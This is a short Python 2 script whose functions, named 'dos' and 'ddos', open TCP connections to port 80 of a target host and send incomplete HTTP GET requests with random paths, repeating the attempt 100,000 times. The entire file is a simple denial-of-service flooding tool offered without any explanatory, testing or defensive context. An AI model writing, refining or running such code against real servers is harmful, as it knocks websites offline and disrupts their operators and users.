import time, socket, os, sys, string, uuid

port=80
message=uuid.uuid4()
conn=100000

def dos(host):
    ip = socket.gethostbyname(host)
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ddos.settimeout(5)
    try:
        ddos.connect((host, 80))
        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
    except socket.error, msg:
        print("-error-")
    ddos.close()

def start(host) :
    for i in xrange(conn):
        dos(host)

